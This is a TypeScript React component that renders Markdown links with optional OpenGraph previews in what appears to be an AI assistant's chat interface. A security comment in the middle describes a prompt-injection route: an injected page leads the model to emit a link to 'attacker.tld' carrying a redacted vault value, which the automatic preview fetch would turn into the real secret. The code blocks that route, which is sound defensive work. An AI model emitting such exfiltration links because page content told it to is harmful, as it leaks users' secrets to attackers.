import { useContext, useEffect, useState } from "react";
import { useHost, type LinkPreviewData } from "../../../host";
import { useLinkOpen } from "../../../containers/providers/linkOpen";
import { realLinkHref } from "../../linkHref";
import { LinkPreview, LinkPreviewSkeleton } from "../../LinkPreview";
import { LinkOpenMenu } from "../../LinkOpenMenu";
import { InTableContext, MarkdownDocContext } from "../context";

// Session cache of fetched previews (keyed by URL) so a re-render/remount — e.g. the
// assistant message re-parsing its Markdown on EVERY streamed chunk — reuses the
// result instead of re-fetching and flickering. Bounded (FIFO) since image `data:`
// URLs can be large.
const PREVIEW_CACHE = new Map<string, LinkPreviewData | null>();
const PREVIEW_CACHE_MAX = 100;
function cachePreview(url: string, v: LinkPreviewData | null): void {
  if (!PREVIEW_CACHE.has(url) && PREVIEW_CACHE.size >= PREVIEW_CACHE_MAX)
    PREVIEW_CACHE.delete(PREVIEW_CACHE.keys().next().value as string);
  PREVIEW_CACHE.set(url, v);
}

/** The visible text of a link child, when it's a single plain string (else null). */
function childText(child: unknown): string | null {
  if (typeof child === "string") return child;
  if (Array.isArray(child) && child.length === 1 && typeof child[0] === "string") return child[0];
  return null;
}

/**
 * An inline link with a subtle hover animation. The FULL destination URL is
 * revealed ONLY on a PROLONGED hover (the native `title` tooltip's built-in delay)
 * — never eagerly, so a long URL doesn't shout. When the link's visible TEXT is
 * itself a bare URL it is truncated to a character budget (CSS `ch` ellipsis) so a
 * long URL doesn't dominate — the full text stays selectable + on prolonged hover.
 * When link previews are enabled (privacy opt-in) the OpenGraph card fetched by the
 * platform (`host.links.preview`) is rendered INLINE, directly under the link.
 * Fetched eagerly once, then cached.
 */
// eslint-disable-next-line @typescript-eslint/no-explicit-any
export function MarkdownLink({ previewEnabled: previewProp, ...props }: any) {
  const host = useHost();
  const { openInBrowser } = useLinkOpen();
  // A link inside a table never previews (the card would break the cell layout).
  const inTable = useContext(InTableContext);
  // Un-redact the destination (URL-encoding aware): a fake left in the href — its
  // space `%20`/`+`-encoded — would otherwise open a BROKEN URL. See `realLinkHref`.
  const { vault } = useContext(MarkdownDocContext);
  const href: string | undefined = realLinkHref(props.href, vault);
  const isHttp = typeof href === "string" && /^https?:\/\//i.test(href);
  // ⚠️ SECURITY — a link whose href carried a VAULT VALUE is never auto-previewed.
  // `realLinkHref` restores the real value so a CLICK reaches the right page (a user
  // action, and root rule 11's outward-real). But the preview fetch is AUTOMATIC: the
  // model only ever holds fakes, so an injected page can make it emit
  // `[voir](https://attacker.tld/?d=<fake>)` and this component would resolve the fake
  // to the REAL value and GET it — a fake→real oracle over the whole vault, with no
  // click. `safeFetch` blocks private hosts but has no public-host allow-list, so the
  // destination is attacker-chosen. Rule 11's outward-real covers what the USER or the
  // model DISPATCHES; an automatic background fetch is neither, so here we do withhold
  // the material. Pinned by `MarkdownLink.preview.test.ts`.
  const hrefCarriesVaultValue = href !== props.href;
  const previewEnabled = previewProp && !inTable && !hrefCarriesVaultValue;
  // Seed from the session cache so a remount (Markdown re-parsing each streamed
  // chunk) shows the cached card immediately — no flicker, no re-fetch.
  const [preview, setPreview] = useState<LinkPreviewData | null>(() =>
    href ? PREVIEW_CACHE.get(href) ?? null : null,
  );
  // Whether a fetch is in flight — drives the skeleton card. Seeded true when this
  // URL will be fetched (enabled + http + not already cached), so the placeholder
  // shows on first paint instead of nothing until the fetch resolves.
  const [loading, setLoading] = useState<boolean>(
    () => isHttp && !!previewEnabled && !!host.links?.preview && !!href && !PREVIEW_CACHE.has(href),
  );

  // Fetch the OG card ONCE per URL (session-cached) so it can sit right under the
  // link. Best-effort: a refused/failed fetch just yields no card. Gated on the
  // opt-in + host support; a cache hit skips the fetch entirely.
  useEffect(() => {
    if (!isHttp || !previewEnabled || !host.links?.preview) {
      setLoading(false);
      return;
    }
    if (PREVIEW_CACHE.has(href!)) {
      setPreview(PREVIEW_CACHE.get(href!)!);
      setLoading(false);
      return;
    }
    let alive = true;
    setLoading(true);
    host.links
      .preview(href!)
      .then((p) => {
        cachePreview(href!, p);
        if (alive) {
          setPreview(p);
          setLoading(false);
        }
      })
      .catch(() => {
        if (alive) setLoading(false);
      });
    return () => {
      alive = false;
    };
  }, [href, isHttp, previewEnabled, host.links]);

  // Truncate ONLY when the link's own text is a bare URL (so a "voir ici" label is
  // never clipped). `title={href}` = full URL on prolonged hover (native delay).
  const text = childText(props.children);
  const bareUrl = text != null && (text === href || /^https?:\/\//i.test(text));
  const anchor = (
    <a
      {...props}
      href={href}
      title={href}
      target="_blank"
      rel="noreferrer"
      className={bareUrl ? "md-link md-link-url" : "md-link"}
    />
  );
  // On the desktop (agent browser available) wrap the link in a hover menu so the
  // user can pick where it opens — integrated split browser vs external. Without the
  // integrated option (browser preview / mobile) there's no choice, so keep the plain
  // link (a click already opens external).
  const link = isHttp && openInBrowser ? <LinkOpenMenu href={href!}>{anchor}</LinkOpenMenu> : anchor;
  // `previewEnabled` gates the CARD too (not just the fetch): a cached preview from
  // a same-URL link elsewhere must not resurface inside a table.
  if (!isHttp || !previewEnabled) return link;
  // Loaded card, else a skeleton while the fetch is in flight, else just the link
  // (fetch resolved with no card, or previews disabled/unsupported).
  const card = preview ? <LinkPreview data={preview} /> : loading ? <LinkPreviewSkeleton /> : null;
  if (!card) return link;

  return (
    <span className="md-link-wrap">
      {link}
      <span className="md-link-card">{card}</span>
    </span>
  );
}
